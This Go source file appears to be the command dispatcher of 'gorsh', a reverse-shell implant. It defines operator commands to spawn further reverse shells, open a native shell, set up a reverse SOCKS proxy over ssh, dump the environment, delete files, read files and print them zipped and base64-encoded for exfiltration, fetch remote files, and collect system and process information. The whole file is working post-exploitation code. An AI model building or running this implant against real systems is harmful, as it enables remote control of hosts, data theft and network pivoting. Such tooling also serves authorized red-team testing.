package commands

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"

	"github.com/audibleblink/gorsh/internal/directory"
	"github.com/audibleblink/gorsh/internal/fetch"
	"github.com/audibleblink/gorsh/internal/sitrep"
	"github.com/audibleblink/gorsh/internal/socks"
	"github.com/audibleblink/gorsh/internal/zip"
	"github.com/shirou/gopsutil/process"
)

type cmdFunc func(...string) string
type genFunc func(string) ([]byte, error)

type command struct {
	Name     string
	ArgHint  string
	Desc     string
	ArgCount int
	ArgReq   bool
	cmdFn    cmdFunc
}

func (c *command) Help() string {
	return fmt.Sprintf("%-6s %-12s %s  %s\n", c.Name, c.ArgHint, "|", c.Desc)
}

func (c *command) Execute(argv []string) string {
	var output string
	output = c.cmdFn(argv...)
	return output
}

var commands []*command

func init() {
	commands = []*command{
		&command{
			Name:     "spawn",
			ArgHint:  "",
			Desc:     "Start another reverse shell",
			ArgCount: 0,
			ArgReq:   false,
			cmdFn:    spawnFn},
		&command{
			Name:     "shell",
			ArgHint:  "",
			Desc:     "Drops into a native shell. Mind your OPSEC",
			ArgCount: 0,
			ArgReq:   false,
			cmdFn:    nil},
		&command{
			Name:     "socks",
			ArgHint:  "<port>",
			Desc:     "Create a reverse SOCKS proxy on <port> over ssh",
			ArgCount: 1,
			ArgReq:   true,
			cmdFn:    socksFn},
		&command{
			Name:     "env",
			ArgHint:  "",
			Desc:     "Dump the ENV",
			ArgCount: 0,
			ArgReq:   false,
			cmdFn:    envFn},
		&command{
			Name:     "cd",
			ArgHint:  "[path]",
			Desc:     "Change the process' working directory",
			ArgCount: 1,
			ArgReq:   false,
			cmdFn:    cdFn},
		&command{
			Name:     "rm",
			ArgHint:  "[path]",
			Desc:     "Delete a file",
			ArgCount: 1,
			ArgReq:   true,
			cmdFn:    rmFn},
		&command{
			Name:     "ls",
			ArgHint:  "[path]",
			Desc:     "List the current working directory",
			ArgCount: 1,
			ArgReq:   false,
			cmdFn:    lsFn},
		&command{
			Name:     "pwd",
			ArgHint:  "",
			Desc:     "Print the current working directory",
			ArgCount: 0,
			ArgReq:   false,
			cmdFn:    pwdFn},
		&command{
			Name:     "ps",
			ArgHint:  "",
			Desc:     "Print process information",
			ArgCount: 0,
			ArgReq:   false,
			cmdFn:    psFn},
		&command{
			Name:     "cat",
			ArgHint:  "<file>",
			Desc:     "Print the contents of the given file",
			ArgCount: 1,
			ArgReq:   true,
			cmdFn:    catFn},
		&command{
			Name:     "zipcat",
			ArgHint:  "<file>",
			Desc:     "Compress, base64, and print the given file",
			ArgCount: 1,
			ArgReq:   true,
			cmdFn:    zipcatFn},
		&command{
			Name:     "base64",
			ArgHint:  "<file>",
			Desc:     "Base64 encode the given file and print",
			ArgCount: 1,
			ArgReq:   true,
			cmdFn:    base64Fn},
		&command{
			Name:     "fetch",
			ArgHint:  "<URI> <file>",
			Desc:     "Fetch stuff. http[s]:// or //share/folder (Windows only)",
			ArgCount: 2,
			ArgReq:   true,
			cmdFn:    fetchFn},
		&command{
			Name:     "sitrep",
			ArgHint:  "",
			Desc:     "Situation Awareness information",
			ArgCount: 0,
			ArgReq:   false,
			cmdFn:    sitrepFn},
		&command{
			Name:     "help",
			ArgHint:  "",
			Desc:     "Print this help menu",
			ArgCount: 0,
			ArgReq:   false,
			cmdFn:    helpFn}}
}

// Route handles the argv input and dispatches to the propper function
func Route(argv []string) string {
	cmd := _find(argv[0])
	if cmd == nil {
		return "command not found. Try 'help' for a list of available commands"
	}

	if cmd.ArgReq && cmd.ArgCount != len(argv)-1 {
		return fmt.Sprintf("Usage: %s %s\n", cmd.Name, cmd.ArgHint)
	}

	output := cmd.Execute(argv)
	return output
}

// Command functions
func socksFn(argv ...string) string {
	// concurrent function that starts socks server and forwards back over ssh
	err := socks.ListenAndForward(argv[1])
	if err != nil {
		return err.Error()
	}
	return "Done"
}

func cdFn(argv ...string) string {
	if len(argv) > 1 {
		paths, err := filepath.Glob(argv[1])
		if err != nil {
			return err.Error()
		}

		if len(paths) == 1 {
			os.Chdir(paths[0])
		} else {
			return "Glob returned more than 1 result"
		}
	} else {
		usr, _ := user.Current()
		os.Chdir(usr.HomeDir)
	}
	dir, _ := os.Getwd()
	return fmt.Sprintf("Current Directory: %s", dir)
}

func envFn(argv ...string) string {
	return sitrep.Environ()
}

func rmFn(argv ...string) string {
	err := os.RemoveAll(argv[1])

	if err != nil {
		return err.Error()
	}
	return "Object Deleted."
}

func lsFn(argv ...string) string {
	output, err := directory.List(argv)
	if err != nil {
		return err.Error()
	}
	return output
}

func pwdFn(argv ...string) string {
	output, err := os.Getwd()
	if err != nil {
		return err.Error()
	}
	return output
}

func psFn(argv ...string) string {
	output := sitrep.Processes()
	return output
}

func catFn(file ...string) string {
	output, err := _handleGlob(file[1], ioutil.ReadFile)
	if err != nil {
		return err.Error()
	}

	return string(output)
}

func zipcatFn(file ...string) string {
	bytes, err := zip.Bytes(file[1])
	if err != nil {
		return err.Error()
	}
	b64 := base64.StdEncoding.EncodeToString(bytes)
	return b64
}

func base64Fn(file ...string) string {
	bytes, err := ioutil.ReadFile(file[1])
	if err != nil {
		return err.Error()
	}
	b64 := base64.StdEncoding.EncodeToString(bytes)
	return b64
}

func fetchFn(file ...string) string {
	bytes, err := fetch.Get(file[1], file[2])
	if err != nil {
		return err.Error()
	}
	output := fmt.Sprintf("%d bytes copied to %s",
		bytes, file[1])
	return output
}

func spawnFn(file ...string) string {
	pid := int32(os.Getpid())
	proc, err := process.NewProcess(pid)
	if err != nil {
		return err.Error()
	}

	p, err := proc.Exe()
	if err != nil {
		return err.Error()
	}

	cmd := exec.Command(p)
	cmd.Start()
	return ""
}

func sitrepFn(argv ...string) string {
	output := sitrep.SysInfo()
	return output
}

func helpFn(args ...string) string {
	var output string
	for _, cmd := range commands {
		output += fmt.Sprintf(cmd.Help())
	}
	return output
}

func _handleGlob(path string, cb genFunc) (string, error) {
	matches, err := filepath.Glob(path)
	if err != nil {
		return "", err
	}

	var result string
	var errors string
	for _, file := range matches {
		output, err := ioutil.ReadFile(file)
		if err != nil {
			errors += fmt.Sprintf("%s\n", err.Error())
		}

		result += fmt.Sprintf("%s\n", output)
	}
	return result + errors, err
}

func _find(cmd string) *command {
	var outCmd *command
	for _, c := range commands {
		if cmd == c.Name {
			outCmd = c
		}
	}
	return outCmd
}
